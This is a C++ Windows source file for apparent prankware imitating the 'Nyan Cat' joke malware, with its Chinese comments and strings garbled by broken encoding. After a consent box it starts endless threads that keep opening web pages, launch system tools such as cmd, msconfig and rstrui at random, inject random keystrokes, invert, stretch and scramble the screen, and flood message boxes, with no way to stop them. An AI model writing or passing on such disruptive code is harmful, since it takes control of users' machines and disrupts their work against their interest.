#include<bits/stdc++.h>
#include<tchar.h>
#include<windows.h>
using namespace std;
//��������һ����̺߳��� 
void *StartEdge(void *args);
void *StartSystemApps(void *args);
void *PlaySystemSounds(void *args);
void *RandKeybdEvent(void *args);
void *Distinvert(void *args);
void *RandMsgBx(void *args);
void *DrawIco(void *args);
void *StretchDesk(void *args);
void *PutDeskRandPosPhotoToRandPos(void *args);
double GetDF();//����ǻ�ȡ�����ʵģ���õ�ʱ����ʾ�쳣 
double DF;//������������ʣ������̶߳�Ҫ���������԰����������������� 
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)//�޶���è��ʲ���������ʢ��Ļ!! 
{
	DF=GetDF();
	//Step 1:��ʾȷ�����е���
	int x;
	while(1)
	{
		x=MessageBox(NULL,"��ϲ�㿴�����������Ʒ��\n����ƷΪ�߷°�ʺ�è����\n\
��������ֻ����������������������ϹŲ������������ƻ���ĵ��ԣ����Ա�д������߷°�ʺ�è.\n\
\n\
���ˣ�����Ϊ�˱�д�˳����ͷ��������ˣ�д������һ�����簡�����������ԡ�����һ��Ҫ����޻��߹ظ�ע���������ܸ��Ҷ������Ͼ�����Cվ�����߲�����\n\
�Ƿ����У�","Nyan Cat",MB_ICONINFORMATION|MB_OKCANCEL); 
		if(x==IDOK)
			break;
		else
			MessageBox(NULL,"�򶼴��ˣ����������!","Nyan Cat",MB_ICONERROR|MB_OK);
	}
	//Step 2:д����ʾ�ļ�
	freopen("Note.txt","w",stdout);
	cout<<"�����Ѿ����У�\n��ĵ��ԡ����������ٴ����� �Ͼ������޺���\n:D\n��ԭ�没���������������\
��ֱ�ӵ��µ���������������Ȼ�󡭡�����MBR���ƻ������Ծ����������ˣ����Ҳ��ᣬ\
�����޺���ʺ�è����������ʱ���Դ����������������ң���Ҳ�����ƻ����MBR!";
	fclose(stdout);
	system("start Note.txt"); 
	
	Sleep(10000);
	pthread_t tids[10];
	
	//Step 3:������20����վ
	pthread_create(&tids[0],NULL,StartEdge,NULL);//�����̣߳���ϸ�������̺߳����� 
	
	Sleep(20000);
	
	//Step 4:�����ϵͳӦ��
	pthread_create(&tids[1],NULL,StartSystemApps,NULL);//�����̣߳���ϸ�������̺߳�����
	
	Sleep(10000);
	
	//Step 5:�������ϵͳ��ʾ�� 
	pthread_create(&tids[2],NULL,PlaySystemSounds,NULL);//�����̣߳���ϸ�������̺߳�����
	
	//Step 6:������¼����е�һ����
	pthread_create(&tids[3],NULL,RandKeybdEvent,NULL);//�����̣߳���ϸ�������̺߳�����
	
	Sleep(5000);
	
	//Step 7:��Ļ��ɫ
	pthread_create(&tids[4],NULL,Distinvert,NULL);//�����̣߳���ϸ�������̺߳�����
	
	//Step 8:�ҵ���ʾ����
	pthread_create(&tids[5],NULL,RandMsgBx,NULL);//�����̣߳���ϸ�������̺߳����� 
	
	Sleep(10000);
	
	//Step 9:��ͼ��
	pthread_create(&tids[6],NULL,DrawIco,NULL);//�����̣߳���ϸ�������̺߳�����
	
	Sleep(20000);
	
	//Step 10:��Ļ����������
	pthread_create(&tids[7],NULL,StretchDesk,NULL);//�����̣߳���ϸ�������̺߳����� 
	
	Sleep(10000);
	
	//Step 11:����Ļ����һ��λ��������һ��λ��
	pthread_create(&tids[8],NULL,PutDeskRandPosPhotoToRandPos,NULL);//�����̣߳���ϸ�������̺߳�����
	
	Sleep(30000);
	//��ʾ�Ƿ��˳�
	int msg;
	msg=MessageBox(NULL,"�������л��ڶ���չʾ��ϣ���ȷ�����˳�.","Nyan Cat",MB_ICONINFORMATION|MB_OK); 
	return 0;//�����˳� 
}
//��д��һ����̺߳���
void *StartEdge(void *args)
{
	const TCHAR szOperation[]=_T("open");
	const TCHAR szAddress[10][70]={_T("http://cn.bing.com/"),
								 _T("http://hao.360.com/"),
								 _T("https://code.xueersi.com/space/14941771"),
								 _T("https://www.bilibili.com/"),
								 _T("https://p4psearch.1688.com/hamlet.html?scene=6&cosite=msdaohang"),
								 _T("https://code.xueersi.com/space/14941771"),
								 _T("https://www.luogu.com.cn/"),
								 _T("https://code.xueersi.com/space/14941771"),
								 _T("https://code.xueersi.com/space/14941771")};
	for(int i=0;i<10;i++)
	{
		HINSTANCE hRslt=ShellExecute(NULL,szOperation,szAddress[i],NULL,NULL,SW_SHOWNORMAL);
		assert(hRslt>(HINSTANCE)HINSTANCE_ERROR);
		Sleep(10000);
	}
	for(int i=0;i<10;i++)
	{
		HINSTANCE hRslt=ShellExecute(NULL,szOperation,szAddress[i],NULL,NULL,SW_SHOWNORMAL);
		assert(hRslt>(HINSTANCE)HINSTANCE_ERROR);
		Sleep(10000);
	}
}
void *StartSystemApps(void *args)
{
	char *Apps[10]={"start msinfo32.exe",
					 "start calc",
					 "start control",
					 "start explorer",
					 "start cmd",
					 "start winver",
					 "start msconfig",
					 "start perfmon",
					 "start resmon",
					 "start rstrui"};
	srand(time(0));
	int AppID,SpTime=10000;
	while(1)
	{
		AppID=rand()%10;
		system(Apps[AppID]);
		Sleep(SpTime);
		if(SpTime>=5000)
			SpTime-=400;
	}
}
void *PlaySystemSounds(void *args)
{
	srand(time(0));
	int SoundsID,SpTime=1000;
	while(1)
	{
		SoundsID=rand()%2;
		if(SoundsID==0)
			MessageBeep(MB_ICONWARNING);
		else
			MessageBeep(MB_ICONERROR);
		Sleep(SpTime);
		if(SpTime>=700)
			SpTime-=20;
	}
}
void *RandKeybdEvent(void *args)
{
	srand(time(0));
	int KeyID;
	while(1)
	{
		KeyID=rand()%42+48;
		keybd_event(KeyID,0,0,0);
		keybd_event(KeyID,0,2,0);
		Sleep(1000);
	}
}
void *Distinvert(void *args)
{
	HDC hdc=GetWindowDC(GetDesktopWindow());
	int cx=GetSystemMetrics(SM_CXSCREEN)*DF;
	int cy=GetSystemMetrics(SM_CYSCREEN)*DF;
	while(1)
	{
		BitBlt(hdc,0,0,cx,cy,hdc,0,0,DSTINVERT);
		Sleep(2000);
	}
}
void *RandBx(void *args)
{
	srand(time(0));
	while(1)
		MessageBox(NULL,"Still using this computer?","Nyan Cat",MB_ICONWARNING);
}
void *RandMsgBx(void *args)
{
	pthread_t tids;
	int Slp=10000;
	int cx=GetSystemMetrics(SM_CXSCREEN);
	int cy=GetSystemMetrics(SM_CYSCREEN);
	RECT rect;
	while(1)
	{
		pthread_create(&tids,NULL,RandBx,NULL);
		HWND hwnd=FindWindow(NULL,"Nyan Cat");
		GetWindowRect(hwnd,&rect);
		MoveWindow(hwnd,rand()%cx,rand()%cy,rect.right-rect.left,rect.bottom-rect.top,TRUE);
		Sleep(Slp);
		if(Slp>=500)
			Slp-=100;
	}
}
void *DrawIco(void *args)
{
	HDC hdc=GetWindowDC(GetDesktopWindow());
	int cx=GetSystemMetrics(SM_CXSCREEN)*DF;
	int cy=GetSystemMetrics(SM_CYSCREEN)*DF;
	POINT p;
	srand(time(0));
	int temp=0;
	while(1)
	{
		GetCursorPos(&p);
		DrawIcon(hdc,p.x*DF,p.y*DF,LoadIcon(NULL,IDI_ERROR));
		if(temp%10==0)
			DrawIcon(hdc,rand()%cx,rand()%cy,LoadIcon(NULL,IDI_WARNING));
		Sleep(20);
	}
}
void *StretchDesk(void *args)
{
	HDC hdc=GetWindowDC(GetDesktopWindow());
	int cx=GetSystemMetrics(SM_CXSCREEN)*DF;
	int cy=GetSystemMetrics(SM_CYSCREEN)*DF;
	int Slp=2000;
	while(1)
	{
		StretchBlt(hdc,50,50,cx-50*2,cy-50*2,hdc,0,0,cx,cy,SRCCOPY);
		Sleep(Slp);
		if(Slp>=0)
			Slp-=20;
	}
}
void *PutDeskRandPosPhotoToRandPos(void *args)
{
	HDC hdc=GetWindowDC(GetDesktopWindow());
	int cx=GetSystemMetrics(SM_CXSCREEN)*DF;
	int cy=GetSystemMetrics(SM_CYSCREEN)*DF;
	srand(time(0));
	while(1)
	{
		BitBlt(hdc,rand()%cx,rand()%cy,rand()%800,rand()%600,hdc,rand()%cx,rand()%cy,SRCCOPY);
		Sleep(200);
	}
}
double GetDF()
{
    HWND hWnd=GetDesktopWindow();
    HMONITOR hMonitor=MonitorFromWindow(hWnd, MONITOR_DEFAULTTONEAREST);
    MONITORINFOEX miex;
    miex.cbSize=sizeof(miex);
    GetMonitorInfo(hMonitor,&miex);
    int cxLogical=(miex.rcMonitor.right-miex.rcMonitor.left);
    int cyLogical=(miex.rcMonitor.bottom-miex.rcMonitor.top);
    DEVMODE dm;
    dm.dmSize=sizeof(dm);
    dm.dmDriverExtra=0;
    EnumDisplaySettings(miex.szDevice,ENUM_CURRENT_SETTINGS,&dm);
    int cxPhysical=dm.dmPelsWidth;
    int cyPhysical=dm.dmPelsHeight;
    double horzScale=((double)cxPhysical/(double)cxLogical);
	return horzScale;
}
